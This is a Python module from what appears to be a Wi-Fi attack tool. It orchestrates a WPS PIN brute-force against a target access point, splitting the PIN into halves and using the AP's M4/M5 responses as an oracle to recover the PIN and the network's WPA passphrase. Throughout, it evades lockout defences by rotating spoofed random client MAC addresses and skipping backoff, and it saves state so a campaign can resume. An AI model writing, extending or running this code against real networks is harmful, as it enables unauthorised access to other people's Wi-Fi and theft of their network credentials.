"""WpsCampaign — the Focus-facing WPS PIN brute-force orchestrator.

Drives the two-halves (4+3+checksum) PIN sweep.
Tries to keep-alive association, re-associates on loss.

Owns:
- COMMON → first-half → second-half PIN iterator,
- lock detection + adaptive backoff,
- `.run` resume state from filesystem,
- progress/ETA, and
- pause()/resume() to prevent simultaneous TX attacks.

Sweep / oracle wiring (see registrar.py):
  COMMON_PINS, then first-half sweep until the AP returns M5
  (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Optional

from . import pins as pinmod
from .association import WlanTransport, WpsAssociation, random_client_mac, str_to_mac
from .lock import LockTracker
from .registrar import AttemptOutcome, PinResult, WpsRegistrar

logger = logging.getLogger(__name__)


@dataclass
class CampaignState:
    bssid: str
    ssid: str = ""
    phase: str = "common"   # common | first_half | second_half | done | failed
    common_index: int = 0
    p1_index: int = 0
    p2_index: int = 0
    first_half: Optional[str] = None
    skip_middle: Optional[str] = None  # The middle-3 of the (8+3+checksum) PIN.
    found_pin: Optional[str] = None
    found_psk: Optional[str] = None
    attempts: int = 0     # sessions started (incl. rate-limited no-ops)
    tested: int = 0       # attempts that actually reached the M4 oracle
    updated: float = 0.0


def _state_path(state_dir, bssid: str) -> Path:
    return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"


class WpsCampaign:
    _SAVE_EVERY = 16   # checkpoint the .run file every N attempts

    def __init__(self, iface, target, state_dir="captures", log=None,
                 inter_attempt_delay: float = 0.0):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.state_dir = state_dir
        self.log = log or logger.info
        self.inter_attempt_delay = inter_attempt_delay

        self.our_mac = random_client_mac()
        self.assoc: Optional[WpsAssociation] = None
        self.transport: Optional[WlanTransport] = None
        self._ack = False   # set per-session in _ensure_session from set_fake_mac (active-monitor)
        self.lock = LockTracker()

        self.state = self._load_state()
        self._task: Optional[asyncio.Task] = None
        self._paused = False
        self._stop = False
        self.status = "idle"      # idle | running | paused | locked | found | failed | error

        self._attempt_ewma = 0.5  # seconds/attempt, for ETA

        # Suppress consecutive duplicate per-attempt log lines (same pin + same result)
        # AP repeats responses if we don't respond fast enough (which we don't)
        self._last_attempt_sig: Optional[tuple] = None

        # Live lock state for the SECURITY status row's countdown / kind display.
        # "hard" = beacon AP-Setup-Locked (the AP itself says it's not doing WPS);
        # "soft" = our internal backoff after N consecutive pre-oracle rejects.
        self._lock_kind: Optional[str] = None
        self._lock_end_at: Optional[float] = None
        self._consecutive_locks_no_progress = 0

    # ---- persistence --------------------------------------------------------
    def _load_state(self) -> CampaignState:
        path = _state_path(self.state_dir, self.bssid)
        if path.exists():
            try:
                data = json.loads(path.read_text())
                data.setdefault("bssid", self.bssid)
                st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
                if st.found_pin:
                    # Previous run recovered the PIN. The user clicking WPS PIN
                    # again means "re-verify against the live AP" — handled by
                    # _run switching to the "verify" phase.
                    self.log(f"resumed campaign: previously recovered PIN "
                             f"[black bold on cyan] {st.found_pin} [/black bold on cyan]")
                elif st.first_half:
                    # In-progress with first-half locked in — surface it.
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins, [cyan bold]{st.first_half}[/cyan bold]"
                             f"[white bold]????[/white bold]")
                else:
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins")
                return st
            except Exception as e:
                logger.warning("WPS state load failed (%s); starting fresh", e)
        return CampaignState(bssid=self.bssid, ssid=self.target.ssid or "")

    def _save_state(self) -> None:
        self.state.updated = time.time()
        path = _state_path(self.state_dir, self.bssid)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(asdict(self.state), indent=2))
        except Exception as e:
            logger.warning("WPS state save failed: %s", e)

    # ---- lifecycle ----------------------------------------------------------
    def start(self) -> None:
        if self._task and not self._task.done():
            return
        self._stop = False
        self._task = asyncio.create_task(self._run())

    async def stop(self) -> None:
        self._stop = True
        if self._task:
            await asyncio.wait([self._task])
        self._teardown()

    def pause(self) -> None:
        self._paused = True
        if self.status == "running":
            self.status = "paused"

    def resume(self) -> None:
        self._paused = False

    def _teardown(self) -> None:
        if self.transport:
            self.transport.stop()
        if self.assoc:
            self.assoc.stop()
        self.transport = self.assoc = None

    @property
    def eta_seconds(self) -> Optional[float]:
        """Rough worst-case remaining time at the current rate."""
        if self.state.phase == "first_half":
            remaining = 10000 - self.state.p1_index + 1000
        elif self.state.phase == "second_half":
            remaining = 1000 - self.state.p2_index
        elif self.state.phase == "common":
            remaining = len(pinmod.COMMON_PINS) - self.state.common_index + 10000 + 1000
        else:
            return 0.0
        return remaining * self._attempt_ewma

    # ---- the sweep ----------------------------------------------------------
    async def _ensure_session(self) -> bool:
        if self.assoc is None:
            # Arm active-monitor for THIS session's MAC (re-armed after every _rotate_mac) so
            # the AP's M-frames are HW-ACKed — un-ACKed is too flaky for an 11k-PIN sweep.
            armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
            self._ack = armed is not None
            self.assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                                        self.channel, our_mac=self.our_mac)
            self.assoc.start()
            self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac,
                                           ack=self._ack)
            self.transport.start()
        if not self.assoc.associated:
            return await self.assoc.associate()
        return True

    async def _try(self, pin: str) -> AttemptOutcome:
        """One PIN attempt over the kept-alive association."""
        if not await self._ensure_session():
            return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
        self.transport.drain()
        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac)
        return await reg.try_pin(pin)

    def _next_pin(self) -> Optional[str]:
        """The next candidate per the current phase, or None when exhausted."""
        st = self.state
        if st.phase == "verify":
            return st.found_pin  # Verify the already-found PIN
        if st.phase == "common":
            if st.common_index < len(pinmod.COMMON_PINS):
                return pinmod.COMMON_PINS[st.common_index]
            st.phase = "first_half"
        if st.phase == "first_half":
            if st.p1_index < 10000:
                return pinmod.full_pin(f"{st.p1_index:04d}", "000")
            st.phase = "failed"  # Never encountered "Second half wrong"
            return None
        if st.phase == "second_half" and st.first_half is not None:
            # Find the 2nd half to attempt
            while st.p2_index < 1000:
                middle = f"{st.p2_index:03d}"
                # Skip singular second-half already attempted in first_half
                if middle == st.skip_middle:
                    st.p2_index += 1
                    continue
                return pinmod.full_pin(st.first_half, middle)
            st.phase = "failed"
            return None
        return None

    def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Advance the keyspace from one successful attempt."""
        st = self.state
        if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
            self.lock.note_pre_oracle_reject()
            return

        st.tested += 1
        self.lock.note_progress()
        # A real M4 oracle result means the AP IS letting our (rotated) client
        # through. reset the lock ramp so the NEXT soft-lock also skips its wait.
        self._consecutive_locks_no_progress = 0

        # Verify phase has its own dispatch — it doesn't advance the keyspace.
        if st.phase == "verify":
            self._apply_verify_outcome(pin, out)
            return

        if out.result is PinResult.SUCCESS:
            st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
        elif out.first_half_ok:
            # AP reached M5 → this first half is correct. (SECOND_HALF_WRONG)
            if st.phase != "second_half":
                st.first_half = pinmod.split_pin(pin)[0]
                st.phase, st.p2_index = "second_half", 0
                st.skip_middle = pin[4:7]  # Avoid trying the same PIN twice
            else:
                st.p2_index += 1
        elif out.result is PinResult.FIRST_HALF_WRONG:
            if st.phase == "common":
                st.common_index += 1
            elif st.phase == "first_half":
                st.p1_index += 1

    def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Resume-time re-verification of a previously-recovered PIN."""
        st = self.state
        if out.result is PinResult.SUCCESS:
            # PIN verified as working
            new_psk = out.psk or ""
            old_psk = st.found_psk or ""
            if new_psk != old_psk:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
                         f"— [bold yellow]PSK CHANGED[/bold yellow] "
                         f"[dim](updated below)[/dim]")
            else:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
                         f"[dim](PSK unchanged)[/dim]")
            st.found_psk = new_psk
            st.phase = "done"
            return
        if out.first_half_ok:
            # PIN changed: SECOND_HALF_WRONG — first half still valid
            kept = pinmod.split_pin(pin)[0]
            self.log(f"[yellow]PIN's second half changed[/yellow] — "
                     f"first half [green]{kept}[/green] still valid; "
                     f"sweeping second half again")
            st.first_half = kept
            st.found_pin = None
            st.found_psk = None
            st.phase = "second_half"
            st.p2_index = 0
            st.skip_middle = pin[4:7]   # confirmed-wrong middle
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            # PIN changed: Nothing from old PIN is recoverable.
            self.log("[red]PIN no longer valid[/red] "
                     "[dim](first half wrong — restarting full sweep)[/dim]")
            st.first_half = None
            st.found_pin = None
            st.found_psk = None
            st.phase = "common"
            st.common_index = 0
            st.p1_index = 0
            st.p2_index = 0
            st.skip_middle = None

    async def _run(self) -> None:
        self.status = "running"
        name = self.target.ssid or self.bssid
        logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())

        # When resuming with a previously-recovered PIN, re-verify it against the AP
        if self.state.phase == "done" and self.state.found_pin:
            self.log("re-verifying PIN against the AP "
                     "[dim](if the PSK changed, we'll catch it)[/dim]")
            self.state.phase = "verify"

        try:
            while not self._stop:
                if self._paused:
                    self.status = "paused"
                    await asyncio.sleep(0.2)
                    continue

                beacon_locked = self._beacon_locked()
                if self.lock.is_locked(beacon_locked):
                    # Skip the wait the first soft-lock after every tested++:
                    # most "soft locks" are just per-MAC rate-limiting, which a
                    # rotation alone fixes in zero time.
                    skip_wait = (not beacon_locked
                                 and self._consecutive_locks_no_progress == 0)
                    await self._handle_lock(beacon_locked, wait=not skip_wait)
                    if self._stop:
                        break  # Short circuit before next phase
                    self._rotate_mac()
                    self._consecutive_locks_no_progress += 1
                    continue

                pin = self._next_pin()
                if pin is None:
                    self.status = "found" if self.state.found_pin else "failed"
                    break

                self.status = "running"
                # Detect transitions
                prev_first_half = self.state.first_half
                prev_phase = self.state.phase
                t0 = time.monotonic()
                out = await self._try(pin)
                # EWMA: Exponentially Weighted Moving Average. tl;dr math
                self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                self.state.attempts += 1
                self._apply_outcome(pin, out)

                verify_terminal = (prev_phase == "verify" and out.result not in
                                   (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
                # Avoid logging an "attempt" on a verified PIN, or after user halt.
                if not verify_terminal and not self._stop:
                    self._log_attempt(pin, out, prev_first_half)

                if self.state.phase == "done":
                    self._save_state()
                    self.status = "found"
                    break
                if self.state.attempts % self._SAVE_EVERY == 0:
                    self._save_state()
                if self.inter_attempt_delay:
                    await asyncio.sleep(self.inter_attempt_delay)
        except Exception as e:
            logger.exception("WPS campaign crashed")
            self.status = "error"
            self.log(f"[red]campaign error:[/red] {e}")
        finally:
            self._save_state()
            self._teardown()
            await self.iface.clear_fake_mac()

    def _beacon_locked(self) -> bool:
        ap = self.iface.access_points.get(self.bssid) if hasattr(self.iface, "access_points") else None
        return bool(getattr(ap, "wps_locked", False)) if ap else False

    async def _handle_lock(self, beacon_locked: bool, wait: bool = True) -> None:
        """Mark the lock state, optionally wait it out, then release.

        ``wait=False`` is the adaptive fast path for the first soft-lock since
        last progress: we just log + rotate, skipping the (often-unnecessary)
        backoff entirely. Hard locks (beacon WPS-Locked) ALWAYS wait — the AP
        is saying it won't do WPS at all, no point retrying immediately.
        """
        self.lock.begin_lock()
        # "hard" = AP itself advertises WPS locked in its beacons (matches the 🔒
        # in the SECURITY row). "soft" = our backoff after N pre-oracle rejects;
        # AP isn't beaconing locked, it's just refusing rapid retries.
        self._lock_kind = "hard" if beacon_locked else "soft"
        trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
        if wait:
            # Slow path: AP is locked
            backoff = self.lock.backoff()
            self._lock_end_at = time.monotonic() + backoff
            self.status = "locked"
            self.log(f"[red]AP locked[/red] [dim]({self._lock_kind}, {trigger}) "
                     f"backing off {backoff:.0f}s[/dim]")
            self._save_state()
            end = time.monotonic() + backoff
            while time.monotonic() < end and not self._stop:
                await asyncio.sleep(0.5)
                if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                    break
        else:
            # Fast path: Assume AP is not locked to a new MAC
            self.log(f"[yellow]soft-lock[/yellow] [dim]({trigger}) — "
                     f"rotating MAC, no wait[/dim]")
        self.lock.end_lock()
        self._lock_kind = None
        self._lock_end_at = None
        self._last_attempt_sig = None  # The next attempt is a new conversation, don't dedupe.

    @property
    def lock_kind(self) -> Optional[str]:
        """'hard' / 'soft' / None — see _handle_lock."""
        return self._lock_kind

    @property
    def lock_remaining_seconds(self) -> float:
        """Seconds remaining on the current backoff (0 if not locked)."""
        if self._lock_end_at is None:
            return 0.0
        return max(0.0, self._lock_end_at - time.monotonic())

    def _rotate_mac(self) -> None:
        """Tear down the association + transport and select a new random MAC address."""
        if self.transport is not None:
            self.transport.stop()
        if self.assoc is not None:
            self.assoc.stop()
        self.assoc = None
        self.transport = None
        old = self.our_mac
        self.our_mac = random_client_mac()
        logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
        self._last_attempt_sig = None

    def _log_attempt(self, pin: str, out: AttemptOutcome,
                     prev_first_half: Optional[str]) -> None:
        """One concise line per PIN attempt — what was tested, what came back,
        and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
        silent here; the UI closes the campaign tree with bold cyan PIN + green
        PSK leaves via _stop_wps_pin.
        """
        if out.result is PinResult.SUCCESS:
            return
        # First-half just confirmed gets a forced log even if sig duplicates —
        # it's a real state change, the next attempt will have a new pin anyway.
        first_half_just_confirmed = (
            self.state.first_half is not None and prev_first_half is None)

        sig = (pin, out.result)
        if sig == self._last_attempt_sig and not first_half_just_confirmed:
            return  # Avoid duplicate attempt logs
        self._last_attempt_sig = sig

        label = f"trying [cyan]{pin}[/cyan]"
        if first_half_just_confirmed:
            self.log(f"{label} → [green]first half OK[/green] "
                     f"[dim bold]\\[M5][/dim bold] — sweeping second half")
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
        elif out.result is PinResult.SECOND_HALF_WRONG:
            self.log(f"{label} → [dark_orange]second half wrong[/dark_orange] "
                     f"[dim bold]\\[M6][/dim bold]")
        elif out.result is PinResult.PROTO_ERROR:
            self.log(f"{label} → [yellow]AP refused[/yellow] "
                     f"[dim bold]\\[NACK][/dim bold]")
        elif out.result is PinResult.TIMEOUT:
            self.log(f"{label} → [dim]no response[/dim] [dim bold]\\[…][/dim bold]")
